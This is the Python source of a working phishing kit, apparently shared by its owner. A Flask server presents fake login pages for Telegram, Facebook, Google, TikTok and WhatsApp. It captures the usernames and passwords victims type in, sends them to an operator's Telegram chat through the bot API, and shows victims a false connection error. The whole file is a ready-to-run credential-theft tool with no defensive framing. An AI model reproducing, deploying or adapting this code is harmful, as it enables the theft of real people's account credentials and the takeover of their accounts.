import os, requests, sys, base64
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- Configuration ---
CONFIG_FILE = "config.txt"
ENCODED_PASS = "QFlvc2VwaGFsZ2FuZWg0NA==" # @Yosephalganeh44

def check_access():
    print("\n" + "═" * 45)
    print("      YAG GROUP MULTI-PLATFORM TOOL")
    print("      Owner: @Yosephalganeh44")
    print("═" * 45)
    p = input("[?] Enter Access Password: ").strip()
    if p != base64.b64decode(ENCODED_PASS).decode():
        print("[!] Access Denied!"); sys.exit()
    print("[+] Access Granted!\n")

def setup_bot():
    if not os.path.exists(CONFIG_FILE):
        token = input("[?] Bot Token: ").strip()
        chat_id = input("[?] Chat ID: ").strip()
        with open(CONFIG_FILE, "w") as f: f.write(f"{token}\n{chat_id}")
        return token, chat_id
    with open(CONFIG_FILE, "r") as f:
        data = f.read().splitlines()
        return data[0], data[1]

# --- HTML Interface (Multi-Login Design) ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .hidden { display: none; }
        .platform-card { cursor: pointer; transition: 0.3s; }
        .platform-card:hover { transform: scale(1.05); }
    </style>
</head>
<body class="bg-gray-100 flex justify-center items-center min-height-screen p-4">
    <div id="main-container" class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md">
        
        <div id="selection-screen">
            <h1 class="text-2xl font-bold text-center mb-6 text-gray-800">Select Login Method</h1>
            <div class="grid grid-cols-2 gap-4">
                <div onclick="showLogin('Telegram', '#3390ec', 'https://telegram.org/img/t_logo.png')" class="platform-card p-4 border rounded-xl text-center bg-blue-50">
                    <img src="https://telegram.org/img/t_logo.png" class="w-12 mx-auto mb-2">
                    <span class="font-semibold text-blue-600">Telegram</span>
                </div>
                <div onclick="showLogin('Facebook', '#1877f2', 'https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg')" class="platform-card p-4 border rounded-xl text-center bg-blue-50">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="w-12 mx-auto mb-2">
                    <span class="font-semibold text-blue-700">Facebook</span>
                </div>
                <div onclick="showLogin('Google', '#ea4335', 'https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg')" class="platform-card p-4 border rounded-xl text-center bg-red-50">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" class="w-12 mx-auto mb-2">
                    <span class="font-semibold text-red-600">Google</span>
                </div>
                <div onclick="showLogin('TikTok', '#000000', 'https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg')" class="platform-card p-4 border rounded-xl text-center bg-gray-50">
                    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="w-12 mx-auto mb-2">
                    <span class="font-semibold text-black">TikTok</span>
                </div>
                <div onclick="showLogin('WhatsApp', '#25d366', 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg')" class="platform-card p-4 border rounded-xl text-center bg-green-50">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="w-12 mx-auto mb-2">
                    <span class="font-semibold text-green-600">WhatsApp</span>
                </div>
            </div>
        </div>

        <div id="login-screen" class="hidden">
            <button onclick="location.reload()" class="text-gray-500 mb-4 font-bold"><- Back</button>
            <img id="login-logo" src="" class="w-20 mx-auto mb-4">
            <h2 id="login-title" class="text-xl font-bold text-center mb-2"></h2>
            <p id="login-desc" class="text-gray-500 text-center text-sm mb-6"></p>
            
            <input type="text" id="user" placeholder="Email, Phone or Username" class="w-full p-4 border rounded-lg mb-3 outline-none focus:ring-2">
            <input type="password" id="pass" placeholder="Password" class="w-full p-4 border rounded-lg mb-4 outline-none focus:ring-2">
            
            <button id="login-btn" onclick="submitData()" class="w-full p-4 text-white font-bold rounded-lg transition">LOGIN</button>
            <p id="status" class="mt-4 text-center text-red-500 text-sm font-medium"></p>
        </div>
    </div>

    <script>
        let selectedPlatform = "";

        function showLogin(platform, color, logo) {
            selectedPlatform = platform;
            document.getElementById('selection-screen').classList.add('hidden');
            document.getElementById('login-screen').classList.remove('hidden');
            
            document.getElementById('login-logo').src = logo;
            document.getElementById('login-title').innerText = "Login with " + platform;
            document.getElementById('login-desc').innerText = "Enter your " + platform + " credentials to continue.";
            
            let btn = document.getElementById('login-btn');
            btn.style.backgroundColor = color;
            document.getElementById('user').style.borderColor = color;
        }

        async function submitData() {
            let u = document.getElementById('user').value;
            let p = document.getElementById('pass').value;
            let status = document.getElementById('status');

            if(u.length < 4 || p.length < 4) {
                status.innerText = "Please enter valid credentials.";
                return;
            }

            status.style.color = "gray";
            status.innerText = "Verifying...";

            await fetch('/submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({platform: selectedPlatform, user: u, pass: p})
            });

            setTimeout(() => {
                status.style.color = "red";
                status.innerText = "Login Error: Please check your connection or try again later.";
            }, 2000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_PAGE)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    msg = f"🚀 *YAG GROUP - NEW DATA*\n\n" \
          f"*Platform:* `{data['platform']}`\n" \
          f"*User:* `{data['user']}`\n" \
          f"*Pass:* `{data['pass']}`\n\n" \
          f"_System: Credential Captured!_"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"status": "success"})

if __name__ == '__main__':
    check_access()
    BOT_TOKEN, CHAT_ID = setup_bot()
    app.run(host='0.0.0.0', port=5000)
